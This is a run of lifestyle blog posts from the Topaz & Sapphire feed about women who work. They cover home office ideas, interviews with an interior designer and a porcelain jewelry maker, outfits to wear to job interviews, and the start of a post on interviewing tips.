								<content:encoded><![CDATA[<p>Today we&#8217;re rounding up some of our favorite home office spaces in hopes to inspire you to spice up your at-work or at-home office space.</p>
<p>If you work from home, it is so important that you have an area carved out that sparks creativity, productivity, and efficiency. While I love to lounge and get things done from the comfort of my couch, I can oftentimes get distracted by household chores, Netflix, or other people that are in my working area. This is why its vital to have a space, even if it&#8217;s just a little nook, dedicated to getting your work done and not being distracted when you take conference calls remotely.</p>
<h2>Below are 10 spaces that have inspired us to invest more into our home offices, or office nooks:</h2>

<p>As you can see from the above pictures it doesn&#8217;t take much to create a desirable home office space. Your space does not have to be big to be functional. Invest in a good desk, chair, and a few storage options and find a few things to make the space personal to you &#8211; like plants, pictures, or pillows!</p>

								<content:encoded><![CDATA[<h2><span style="font-weight: 400">Meet Lauren Oviatt, Interior Designer, Stylist, TV personality &amp; Mother of 3</span></h2>
<p><span style="font-weight: 400">Lauren Oviatt is a woman who has got it going on — she has a precious family, a creative eye, her dream career, plus few side hustles. While Lauren prioritizes her family first, she also values creativity beyond playtime with her littles and working as a woman in business leaves her feeling fulfilled. We chatted with Lauren to learn more about why she decided to continue her career as a professional interior designer, stylist, and TV personality after having three children (twins included!)</span></p>
<p><img class="alignnone size-large wp-image-1356" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/IMG_1890-1024x777.jpg" alt="Topaz &amp; Sapphire Women Who Work" width="680" height="516" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/IMG_1890-1024x777.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/IMG_1890-300x228.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/IMG_1890-768x583.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p><span style="font-weight: 400">Name: Lauren Stimpson Oviatt</span></p>
<p><span style="font-weight: 400">Occupation: Interior Designer, Stylist, and TV contributor</span></p>
<p><span style="font-weight: 400">Age: 33</span></p>
<p><span style="font-weight: 400">Lives: Salt Lake City, UT</span></p>
<p><span style="font-weight: 400">Education: BA in Public Relations, AS in Interior Design</span></p>
<p><b>What was your first job out of college? What did you learn from that job, and how did it help propel you forward in your career?</b></p>
<p>I was fortunate to be hired by laylagrayce.com in their first year —  it was an incredible experience to work in an environment run by women who were excited and inspired by what they were doing.  It was (then) a small office where I wore many hats and learned a lot because I was fresh out of college and had a lot to prove! I caught a glimpse of the world of home furnishings and the inner-workings behind furniture production, manufacturing and delivering goods to the end-user. It was a crash course in problem solving, customer service and the ever-changing world of home fashion.</p>
<p><b>You decided you wanted to become an interior designer after you had already finished your Bachelor’s Degree in Public Relations. What made you decide to go back to school for Interior Design?</b></p>
<p><span style="font-weight: 400">From a young girl, I always had a propensity for arranging things and improving the way things around me looked.  I can’t tell you how many times I repainted my childhood bedroom —  thanks Mom!  From landscapes to home interiors, fashion and even architecture, it was as if I were storing mental photographs and collecting my own pre-Pinterest idea board of my most favorite places, color combinations, concepts and ideas… and more importantly the way those things made me feel. There is a true connection between quality of life and what we choose to surround ourselves with. </span></p>
<p><span style="font-weight: 400">After working in e-commerce, wedding planning and corporate PR, I realized that if I was going to make a career out of my work, I wanted it to be something that made me jump out of bed in the morning. I went back to school to gain the knowledge and skill base to back up my passion for “beautifying”!  It gave me the confidence to stand behind what I already felt about the world of design.</span></p>
<p><img class="alignnone size-large wp-image-1348" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Nursery-736x1024.jpg" alt="Topaz &amp; Sapphire - Women Who Work" width="680" height="946" /></p>
<p><b>Tell us a little bit about how you felt about working when you became pregnant with your first child, Blair. Did you anticipate going back to work full/part-time after you had her? Did that perspective change at all after having Blair, or after having your twins?</b></p>
<p>Blair’s birth was such an incredible blessing in my life!  Throughout the pregnancy I reminded myself that it was unfair to set expectations until I knew what life would be like with a new baby.  Maybe I would want to jump back into work, maybe I would be struck with the desire to stay home with her and hang up my tool belt. I was glad for this perspective and would say the same to any first-time mom. Don’t stress — know that change is the only certain thing and take it one day at a time.</p>
<p>It wasn’t without its growing pains, but after an extended maternity leave I began to work part-time and it was wonderful! I was able to keep my foot in the door of design and spend lots of quality time with my new baby. Most days I still think that I wasn’t cut out for “stay-at-home motherhood,” it is one TOUGH gig! Respect (to those who do it)! I am grateful to have the chance to pursue a career I love and set my own schedule, (but) family still comes first.</p>
<p><img class="alignnone size-full wp-image-1349" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Stimpson-Oviatt-Kids.jpg" alt="Topaz &amp; Sapphire - Women Who Work" width="812" height="580" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Stimpson-Oviatt-Kids.jpg 812w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Stimpson-Oviatt-Kids-300x214.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Stimpson-Oviatt-Kids-768x549.jpg 768w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Stimpson-Oviatt-Kids-242x172.jpg 242w" sizes="(max-width: 812px) 100vw, 812px" /></p>
<p>With the subsequent birth of my twins, I gave myself the same advice —  no unrealistic expectations, take it easy and do what feels right. Within a few months of their births, I felt the pull back to work and began to set my client schedule accordingly — starting slow and working my way back up to a work week that I could manage.</p>
<p><b>What drove you to continue your career after having your three kids?</b></p>
<p><span style="font-weight: 400">Feeling the support of family, peers and clients gave me the confidence to jump back into design. I get an incredible sense of satisfaction when my hard work, creativity and execution results in a transformed space and a happy client!  Like I said before, people are SO much happier in spaces that have elements of beauty, function and purpose — spaces that reflect the best version of who they are and how they want to live. To be able to deliver that service to my clients is the most incredible reward.</span></p>
<p><img class="alignnone size-large wp-image-1346" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Topaz-Sapphire-805x1024.jpg" alt="Topaz &amp; Sapphire - Women Who Work" width="680" height="865" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Topaz-Sapphire-805x1024.jpg 805w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Topaz-Sapphire-236x300.jpg 236w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Topaz-Sapphire-768x978.jpg 768w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Topaz-Sapphire.jpg 1019w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p><b>What excites you most about pursuing a career in interior design?</b></p>
<p>I recently heard a renowned designer say, “I believe that beauty will save the world, and I like to think I’m doing my part.” I LOVE that. I couldn’t agree more. Happy homes create happy people and that is a powerful thing! From a personal standpoint, it is gratifying to have a career where I can do what I love, continue to stretch myself and use my talents to improve the lives of others. There are so many facets of this career and I think it is a lifelong pursuit.</p>
<p><b>Where do you derive your creativity and/or inspiration?</b></p>
<p><span style="font-weight: 400">I constantly study the world around me. It’s a blessing and a curse! For example, I can’t watch a romantic comedy without critiquing the set design. I’ve watched You’ve Got Mail and The Holiday at least a hundred times! I love to study the work of other designers and read about their methods and successes. I take EVERYTHING in… from the colors of the changing seasons to the color combinations used in fashion and floral design. I study spaces and images to develop a better sense of scale, proportion, balance and other design elements that truly make for incredible spaces. It is part science, part creativity and part serendipity!</span></p>
<p><img class="alignnone size-large wp-image-1350" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/L.-Oviatt-Design-Group-Topaz-Sapphire-1024x645.jpg" alt="Topaz &amp; Sapphire - Women Who Work" width="680" height="428" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/L.-Oviatt-Design-Group-Topaz-Sapphire-1024x645.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/L.-Oviatt-Design-Group-Topaz-Sapphire-300x189.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/L.-Oviatt-Design-Group-Topaz-Sapphire-768x484.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p><b>Who are your favorite interior designers?</b></p>
<p><span style="font-weight: 400">I could never talk about the designers I love most without crediting Candice Olson and Sarah Richardson. As a teenager I watched them thrive as “TV designers” and I think it has given me the confidence to venture into television. I loved the glimpse into their projects, their everyday lives, their triumphs and trials of the job. Both Sarah and Candice have an on-camera presence that really made an impression on me.</span></p>
<p><b>You mentioned that you have ventured into television. How are you involved with Studio 5? How did you get involved with doing regular segments on Studio 5?</b></p>
<p><span style="font-weight: 400">During my undergrad studies in communications, I took broadcast classes and felt really comfortable in front of the camera. Even though I didn&#8217;t have a passion for current events or news writing, my parents frequently reminded me of my talent in broadcast. A few years into my design career, I was looking for a way to combine my passion for design and a little TV work. I had a friend at the time who was an assistant producer for KSL Studio 5 — the Salt Lake City NBC affiliate — and she suggested I try a segment on their show. I submitted a list of about twenty topics I felt comfortable presenting and scripted the first one on the list. Ten years later and with almost 100 segments under my belt, I still continue to love the connections I make with a wide audience of like-minded, wonderful people and the thrill of being in front of the camera. The producers and staff working on the show believe in empowering women, strengthening families, and sharing tangible ways to live a better life.  As a regular design contributor, I am grateful and lucky to be a part of something so wonderful.</span></p>
<p><img class="alignnone size-large wp-image-1343" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Studio-5-1024x576.jpg" alt="Topaz &amp; Sapphire - Women Who Work" width="680" height="383" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Studio-5-1024x576.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Studio-5-300x169.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Lauren-Oviatt-Studio-5-768x432.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p><b>What does a day-in-the life look like for you?</b></p>
<p>I currently dedicate four days a week to work &#8211; each of those days starts with breakfast with the kiddos, school drop off for Blair, and a BIG hug and kiss goodbye to the twins.  I typically spend a few hours in the office making calls and sending e-mails, before spending the afternoon with clients, on job sites, sourcing materials or installing/accessorizing rooms. No two days are EVER the same! There is always a massive, running “to-do” list — any working mom knows what I’m talking about.</p>
<p><span style="font-weight: 400">My day off happens to be Friday — hooray for Friday!  I spend the day in sweats, with a ponytail, fully immersed in the world of my kids. I love it, I live for it!</span></p>
<p><img class="alignnone size-large wp-image-1342" src="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Women-Who-Work-Interior-Designer-1024x768.jpg" alt="Topaz &amp; Sapphire - Women Who Work" width="680" height="510" srcset="https://topazandsapphire.github.io/wp-content/uploads/2017/10/Women-Who-Work-Interior-Designer-1024x768.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Women-Who-Work-Interior-Designer-300x225.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Women-Who-Work-Interior-Designer-768x576.jpg 768w, https://topazandsapphire.github.io/wp-content/uploads/2017/10/Women-Who-Work-Interior-Designer-320x240.jpg 320w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p><b>You work hand-in-hand with your mother-in-law on a regular basis. What has your experience been working for a family business? Would you recommend it?</b></p>
<p><span style="font-weight: 400">For me working in a family business has been a blessing! I’ve had a boss who loves my kids like I do and who believes like I do that family comes first. My mother-in-law has been a tremendous mentor to me and has always given me the freedom and encouragement to manage my own jobs in my own way.   </span></p>
<p><span style="font-weight: 400">We have gone against all odds when it comes to mother-in-law/daughter-in-law relationships, but after ten years, we are still a happy couple! </span></p>
<p><b>What’s your most memorable #GIRLBOSS moment to date?</b></p>
<p><span style="font-weight: 400">I think back ten years to the first deposit I received from a client remodeling her bedroom.  It wasn’t a million dollars, but it could have been! I had such a rush to have that check in my hand and feel the client’s trust and excitement for the vision I had presented to her. “She actually thinks I can do this! Maybe I CAN!!” </span></p>
<p><b>What’s been the best part of motherhood?</b></p>
<p><span style="font-weight: 400">Having a front row seat to the growth, development and exploration of three young minds.  Being a parent has taught me life lessons that I could have never learned otherwise. At the forefront? Patience, forgiveness, being unselfish, the importance of quality time and recognizing what truly matters, how we show love to one another!  Motherhood is a blessing beyond description — and it isn’t for the faint of heart!  It is the toughest job in the world. Any mom is a working mom! </span></p>
<p><b>How do you balance both motherhood and your career?</b></p>
<p><span style="font-weight: 400">I take life one step at a time. Sometimes the week is so hectic I take it one hour at a time! </span></p>
<p><span style="font-weight: 400">I try to take things in stride, knowing that my plate will always be full but at least I can try to keep it organized and stay one step ahead.</span></p>
<p><span style="font-weight: 400">Luckily, my clients have kids and families too and I’m grateful we have a similar understanding of project timing — around their summer vacation or other hectic seasons of life! I wouldn’t love what I do if I had horrible clients. I think I work for some of the best people I’ve ever met.  </span></p>
<p><b>Do you have any side hustles, passions, or interests that you’re involved in?</b></p>
<p><span style="font-weight: 400">If you follow my instagram you may have a seen a #weekendblooms post or two. I love dabbling in floral design!  I also love entertaining — well, correction, the “hosting” side of things, NOT the cooking side of things. It is all part of my quest to beautify what surrounds me… a pretty table setting, a vase full of flowers for the bedside table in my guest room, a simple gift for a friend tied with trim worth more than the gift itself! </span></p>

<p><b>What advice would you give to any woman aspiring to keep/grow their career as they enter motherhood?</b></p>
<p><span style="font-weight: 400">“You can have everything you want, just not all at once.”  I have prioritized family and work…. so right now, other things are taking a backseat —  like bookclub, classes at the gym, and making gourmet meals every night. I’m okay with that!  Other suggestions to remember during moments of mom-stress or feeling less-than: don’t be so hard on yourself, we are ALL a work in progress, and be sure to take a minute to look around — blessings surround us all! Keep moving forward, do the best you can, (and) look in the mirror and be proud of what you see!</span></p>

With Christmas comes brighter spirits, kinder people, and lots and lots of shopping. For some gift giving is fun and enjoyable, for others holiday shopping is a thing they dread early on in the year.

<p>For <a href="https://topazandsapphire.github.io/category/career/">#womenwhowork</a> it&#8217;s always a bit tough figuring out what to gift to your boss.

We scoured the web and curated the best #girlboss gifts any woman would love. The best part? The majority of &#8220;gifts &amp; things&#8221; for your boss are under $35!</p>

								<content:encoded><![CDATA[<p><em>Preparing and interviewing for a new job can be nerve-wracking. You feel pressured to make a stellar first impression and to answer all questions eloquently and adequately. To make you <a href="https://topazandsapphire.github.io/5-interviewing-tips/">feel more prepared for your next job interview</a>, Sarah from <a href="http://sassyredlipstick.com" target="_blank">Sassy Red Lipstick</a> is sharing a few interview tips, plus what you should wear for three different types of job interviews. Meet our friend and fashion-blogger, Sassy Red!</em></p>
<p>Hi! My name is Sarah and I’m the creator of <a href="http://www.sassyredlipstick.com/" target="_blank">sassy red lipstick</a>! I’m a twenty-something fashionista and soon-to-be San Francisco transplant. I buy too many heels {is there such a thing?!}, and I blog about body positivity and the latest trends. Thanks to Cassie and Latisha for asking me to write an editorial piece today! I’m excited to share with you three outfits you can wear to a job interview that’ll help you dress for success.</p>
<p>I’m a firm believer that what you wear can have an impact, especially at a job interview. “Dress for the job you want” is the popular phrase, right? While it’s most important to be mentally prepared and qualified for the job, your outfit can speak volumes before you even start talking.</p>
<h2>What To Wear: Corporate Job Interview</h2>
<p>My first outfit is something I would wear to a corporate interview. A fitted pair of business casual pants makes a statement, while also being appropriate for the business setting. I added my favorite printed blouse tucked in with a white blazer-like jacket over the top to pull the outfit together. Offices are always cold, plus wearing a third piece shows you mean business {pun intended}. As mentioned before, I love heels. They perfectly dress up any outfit. {If you’re more of a flats girl, rock ‘em! Just make sure they are a dressier pair.}</p>

<div id="attachment_1128" style="width: 690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1128" class="wp-image-1128 size-large" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-2-1024x684.jpg" alt="What to Wear: Corporate Interview featuring sassy red lipstick" width="680" height="454" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-2-1024x684.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-2-300x200.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-2-768x513.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-1128" class="wp-caption-text">PHOTO SOURCE// <a href="http://www.haleynordphotography.com/">Haley Nord</a></p></div>
<p><em>Interview Tip #1: I always bring a few copies of my resume and a digital copy on my iPad {where I can also pull up my blog; interviewers usually ask about your hobbies outside of work and love to see your creative side}. I make sure to plan ahead and bring along anything else I feel could be useful to that specific interview. I toss all those items in a larger bag, which can even fit my laptop if needed. </em></p>
<div id="attachment_1129" style="width: 690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1129" class="wp-image-1129 size-large" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-3-684x1024.jpg" alt="What to Wear: Corporate Interview featuring sassy red lipstick" width="680" height="1018" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-3-684x1024.jpg 684w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-3-200x300.jpg 200w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-3-768x1151.jpg 768w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-3.jpg 1335w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-1129" class="wp-caption-text">PHOTO SOURCE// <a href="http://www.haleynordphotography.com/">Haley Nord</a></p></div>
<p>I would stay away from wearing bright colors or loud prints at a corporate interview. You want to look chic and put-together, while avoiding your outfit being the center of attention. However, I wore cheetah print {it’s my thing!} and gold heels in this outfit to still let my personality shine through.</p>
<p>{See this full post on <a href="http://www.sassyredlipstick.com/business-casual-chic/" target="_blank">my blog here</a>.}</p>
<h2>What To Wear: Fashion-Related Job Interview</h2>
<p>My next outfit is appropriate for a fashion-related job interview. My best advice for an interview like this is to not be overdone; you don’t want to look like you’re trying too hard. If you’re applying for a fashion-related career, the interviewer will already assume you’re into fashion. There’s no need to wear designer from head to toe. I wore a simple, yet flattering olive green dress and added my favorite nude Stuart Weitzman pumps. You want to be comfortable and trendy!</p>
<div id="attachment_1132" style="width: 690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1132" class="wp-image-1132 size-large" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-6-683x1024.jpg" alt="SRL fashion interview outfit - Topaz &amp; Sapphire" width="680" height="1020" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-6-683x1024.jpg 683w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-6-200x300.jpg 200w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-6-768x1151.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-1132" class="wp-caption-text">PHOTO SOURCE// <a href="http://www.haleynordphotography.com/">Haley Nord</a></p></div>
<p>Lastly, I added a statement bag to this outfit—my Celine Luggage Tote. It’s my favorite bag for a few reasons. One, it’s hot pink and two, it’s fashion-forward. Anyone working for a fashion brand should know who the bag is and that’s all the statement you need! As mentioned before, I like to bring bigger bags to interviews so I can have all the essentials with me: copies of my resume, my iPad, and even my laptop.</p>
<div id="attachment_1131" style="width: 690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1131" class="wp-image-1131 size-large" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-5-683x1024.jpg" alt="sassy red lipstick fashion interview outfit - Topaz &amp; Sapphire" width="680" height="1020" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-5-683x1024.jpg 683w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-5-200x300.jpg 200w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/SRL-interview-outfit-photo-5-768x1151.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-1131" class="wp-caption-text">PHOTO SOURCE// <a href="http://www.haleynordphotography.com/">Haley Nord</a></p></div>
<p><em>Interview Tip #2: Arrive at least ten minutes early to get a feel of the office. You also want to be waiting on the interviewer, not the other way around.</em></p>

<h2>What To Wear: Agency Job Interview</h2>
<p>My last outfit is for an agency interview. I graduated with a Bachelor’s Degree in Advertising, so when I say agency interview, I generally think of an ad agency or creative agency. That being said, the work dress code is usually a lot more relaxed.</p>

<p><em>Interview Tip #3: Interviewers will never tell you what to wear to an interview, but you can ask what the office dress code is beforehand or look it up on their website! It makes getting dressed a whole lot easier and then you’ll have a reference for what to wear. It always pays off to do your research!</em></p>
<p>That being said, last Fall I interviewed with a creative agency and wore a more corporate look {think business casual pants and a sweater with heels}. I obviously did not do my homework because I felt way too overdressed—my interviewer was wearing jeans and a tee! Usually I would feel better being overdressed, but in this case I just felt unprepared. Since an agency is usually on the more casual side, I would suggest doing the same.</p>
<p>In my last outfit, I wore a denim dress with sandals and a neck handkerchief. Still fashion-forward and dressed up, without actually wearing jeans {which in any case I would consider a big no-no when interviewing, even if your interviewer is wearing them}. You’ll still feel somewhat in line with the dress code—casual, yet put-together—and you won’t have to worry about being under or overdressed.</p>

<p><span style="font-weight: 400"><strong>Name:</strong> Ashlee Meadows</span></p>
<p><span style="font-weight: 400"><strong>Occupation:</strong> Jewelry Designer and Creator of Ash Jewelry Studio</span></p>
<p><span style="font-weight: 400"><strong>Age:</strong> 35</span></p>
<p><span style="font-weight: 400"><strong>Resides:</strong> Huntersville, N.C.</span></p>
<p><span style="font-weight: 400"><strong>Education:</strong> BFA in Ceramics, BYU.</span></p>
<h3><em>How did you get into jewelry making? Was it something you’ve always been interested in?</em></h3>
<p><span style="font-weight: 400">While I was in college studying ceramics I never imagined I would be creating jewelry.  After graduation I was teaching art and making lots of pottery.  I started experimenting with jewelry and I got hooked.  I love working small and I’m a bit of a perfectionist when it comes to craftsmanship so jewelry is a perfect fit for me.</span></p>
<h3><em>Do you do this full-time or are you involved in other ventures? </em></h3>
<p><span style="font-weight: 400">I guess I work on my business part-time, but it’s getting to be more involved as I spend more and more hours on it each day.  The only other “venture” that I’m involved with is my family.  My husband and I have three little girls so I am busy doing all the regular mom stuff as well as creating and running my own business.  I try to work on my business while they are at school and after bedtime.  </span></p>
<h3><em>What does a typical day look like for you? </em></h3>
<p><span style="font-weight: 400">After I get my three girls off to school my work day begins. Normally this time is spent filling orders or doing administrative stuff.  After school I’m back to mom mode trying to help my kids with homework and making dinner. When the girls are finally asleep in their beds &#8211; that’s when I get to create.  I’m a night owl so my brain is awake and I turn the music on and get to work.</span></p>
<h3><em>If it’s not top secret, can you describe for us the process of making porcelain jewelry?</em></h3>
<div id="attachment_1107" style="width: 690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1107" class="wp-image-1107 size-large" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/in-the-studio-756x1024.jpg" alt="ASH Jewelry Studio - Women Who Work - Topaz &amp; Sapphire" width="680" height="921" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/in-the-studio-756x1024.jpg 756w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/in-the-studio-221x300.jpg 221w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/in-the-studio-768x1040.jpg 768w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-1107" class="wp-caption-text">PHOTO SOURCE// COURTESY OF ASHLEE MEADOWS</p></div>
<p><span style="font-weight: 400">Each piece begins its life as raw, wet, unformed porcelain clay. It is formed by hand, glazed, gilded and fired three separate times over the course of its creation. The <a href="http://www.ashjewelrystudio.com/pages/the-studio" target="_blank">entire process</a> takes me about a week from start to finish, but when I open the kiln after the final firing to see the finished pieces it’s worth all the effort.  Then each piece is ready to be strung onto a 14k gold filled chain or attached to 14k gold filled earrings.</span></p>
<h3><em>Why is porcelain the medium you choose to primarily work with?</em></h3>
<p>As far as different types of clay, porcelain is the whitest in color and the most refined.  I love the texture of porcelain when it’s fired to its full maturity.  It has a raw yet pristine feeling, which pairs beautifully with the smooth shine of the glaze.</p>
<h3><em>What inspires you?</em></h3>
<p><span style="font-weight: 400">The actual process of creating is what inspires me most. When I create a piece I’m often inspired to push myself &#8211; to take it one step further and then even one more step towards something more beautiful or more successful than my original idea.</span></p>
<h3><em>For someone who wants to start their own business, what advice do you have?</em></h3>
<div id="attachment_1105" style="width: 810px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1105" class="wp-image-1105 size-full" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/hexagon-earring-modeled.jpg" alt="ASH Jewelry Studio - Women Who Work - Topaz &amp; Sapphire" width="800" height="390" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/hexagon-earring-modeled.jpg 800w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/hexagon-earring-modeled-300x146.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/hexagon-earring-modeled-768x374.jpg 768w" sizes="(max-width: 800px) 100vw, 800px" /><p id="caption-attachment-1105" class="wp-caption-text">PHOTO SOURCE// COURTESY OF ASHLEE MEADOWS</p></div>
<p><span style="font-weight: 400">I would say don’t put off getting started until everything is perfect.  Start now.  Learn as you go.  After you get a few sales you’ll have more direction and hopefully be able to create a more cohesive line around your most successful items.  Take the time to improve the photography, the branding, and the packaging as you go.  These things will all add value to your work so that you can charge enough to make it worth your time to create your product.</span></p>
<h3><em>Who are some of your favorite jewelry designers?</em></h3>
<p><span style="font-weight: 400">I’m loving <a href="http://janepopejewelry.com/shop/" target="_blank">Jane Pope</a> lately with her simple geometric style.  I&#8217;m also in love with <a href="http://www.shopvale.com/valejewelry/collections" target="_blank">Vale Jewelry</a> whose designers are twin sisters, Eva Bai and Ava Bai.</span></p>
<h3><em>How have you been able to grow your online business?</em></h3>
<p><span style="font-weight: 400">Etsy has been very instrumental in getting my business off the ground.  In addition to selling directly to customers, I get approached by shops within the US and internationally about <a href="https://www.etsy.com/shop/ashjewelrystudio" target="_blank">wholesale via etsy</a>.  I now sell on my <a href="http://www.ashjewelrystudio.com/collections/ash" target="_blank">own website</a> as well, which means that I’ve had to take a more active role with marketing and social media.  Also, I’m just now starting an email newsletter to help spread the word.</span></p>
<h3><em>Most memorable #GIRLBOSS moment to date:</em></h3>
<p><span style="font-weight: 400">Seeing my work at the gift shop at the Bechtler Museum of Modern Art located in the heart of the Queen City was a pretty awesome moment.  I felt like a proud parent to see my little creations on display in such an amazing space.</span></p>
<h3><em>What are your hopes and plans for the future of Ash Jewelry Studio?</em></h3>
<div id="attachment_1106" style="width: 690px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-1106" class="wp-image-1106 size-large" src="https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-1024x1024.jpg" alt="ASH Jewelry Studio - Women Who Work - Topaz &amp; Sapphire" width="680" height="680" srcset="https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-1024x1024.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-150x150.jpg 150w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-300x300.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-768x768.jpg 768w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-80x80.jpg 80w, https://topazandsapphire.github.io/wp-content/uploads/2016/04/small-collection-120x120.jpg 120w" sizes="(max-width: 680px) 100vw, 680px" /><p id="caption-attachment-1106" class="wp-caption-text">PHOTO SOURCE// COURTESY OF ASHLEE MEADOWS</p></div>
<p><span style="font-weight: 400">I’m designing a new collection right now that should be on my site within the next month or so.  It features pieces that are modern and simple as always, but a bit more sculptural than my original collection- more three dimensional.  I’ve been experimenting with some new earrings and even a few rings.  If you follow me on <a href="https://www.instagram.com/ashjewelrystudio/" target="_blank">Instagram @ashjewelrystudio</a>, you will get a peek at some of my new ideas. </span></p>
<h2><span style="font-weight: 400">Ashlee Outside of Ash Jewelry Studio:</span></h2>
<p><span style="font-weight: 400"><strong>Favorite place to eat in the QC</strong>: My kitchen table.  Maybe this is totally boring but I really like cooking yummy, healthy food for my family.</span></p>
<p><span style="font-weight: 400"><strong>Best vacation you have ever taken:</strong> We just spent the holidays at North Carolina’s Outer Banks with my entire family.  We were able to find a home that accommodated my parents’ six children and their 25 grandchildren. It was the best just because I was with the people I love most in this whole world.</span></p>
<p><strong>What you’re reading now: </strong><span style="font-weight: 400">The Life‑Changing Magic of Tidying Up by Marie Kondo. (I don’t think I’m the only creative person out there who is sometimes a disorganized mess ;))</span></p>
<p><span style="font-weight: 400"><strong>What you’re listening to now:</strong> Mumford and Sons Pandora station.  My favorite song of theirs is “Murder in the City”.  The title sounds morbid but if you listen to the words it has such a touching message.</span></p>
<p><span style="font-weight: 400"><strong>What you’re watching on TV now:</strong> When I watch TV I’m normally working on my jewelry in some way.  For this reason I like shows like American Idol or The Voice because I can listen while my eyes are focused on work.</span></p>

								<content:encoded><![CDATA[<p>Interviewing for a job is something not many of us do very often, so when the time comes for an interview, you can feel a little rusty and not on top of your A-game. Whether an employer has contacted you out of the blue, or you&#8217;re on the active job hunt, it&#8217;s always a good thing to brush up on your interviewing skills so you can make a stellar first impression and nail that interview, or better yet &#8211; a job!</p>
<p>Since <a href="https://topazandsapphire.github.io/why-leaving-my-job-was-the-best-decision/">quitting my job a month ago</a> I have become somewhat of an expert in interviewing and thought I would share with you all a few interviewing tips that will help you feel more prepared and confident.</p>
